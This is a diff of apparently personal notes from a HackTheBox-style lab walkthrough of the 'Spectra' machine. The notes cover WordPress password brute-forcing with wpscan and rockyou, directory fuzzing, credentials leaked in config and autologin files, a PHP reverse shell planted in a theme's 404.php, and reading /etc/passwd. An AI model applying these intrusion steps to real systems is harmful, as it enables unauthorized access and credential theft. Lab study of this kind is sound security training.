@@ -14,14 +14,15 @@ curl -s 10.10.10.229 | grep -i "jira" 1>/dev/null && echo "OK"
 curl -s http://spectra.htb/main/ | grep -i "wordpress" 1>/dev/null && echo "OK"
 wpscan --url http://spectra.htb/main/ -e u
 wpscan --url http://spectra.htb/main/ 
-wpscan --url http://spectra.htb/main --passwords ~/Downloads/rockyou.txt --usernames administrator -t 50
+wpscan --url http://spectra.htb/main --passwords ~/Downloads/rockyou.txt --usernames user -t 50
 ```
 
 3. dir
 ``` bash
 wfuzz -c -z file,/opt/node-dirbuster/lists/directory-list-2.3-medium.txt --hc 404 http://spectra.htb/FUZZ
 ```
-administrator : devteam01 (wp)
+user : user (wp)
+devtest: devteam01 (db)
 
 
 ### dir
@@ -44,8 +45,6 @@ wp-blog-header.php
 wp-comments-post.php                               
 wp-config.php                                      
 wp-config.php.save
-> devtest: devteam01
-
 wp-cron.php                                        
 wp-links-opml.php                                  
 wp-load.php                                        
@@ -62,25 +61,27 @@ xmlrpc.php
 failed access 
 
 
-** PORT 3306 ** 
+**PORT 3306** 
 
 
 reverse shell - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-
 http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php
 
 
-connect with user devtest no db, failed 
+> connect with user no db, failed 
 
+```
 root:x:0:0:root:/root:/bin/bash
 chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
 nginx:x:20155:20156::/home/nginx:/bin/bash
 katie:x:20156:20157::/home/katie:/bin/bash
+```
+
 
 
 cat /etc/issue
+```
 Developer Console
-
 To return to the browser, press:
 
   [ Ctrl ] and [ Alt ] and [ <- ]  (F1)
@@ -105,13 +106,13 @@ enable USB booting.  To do so, run the following as root:
 enable_dev_usb_boot
 
 Have fun and send patches!
-
+```
 
 **LinPeas**
 
 bash-4.3$ cat /etc/autologin/passwd
 cat /etc/autologin/passwd
-katie:SummerHereWeCome!!
+user:user
 
 grupos? 
 sudo?
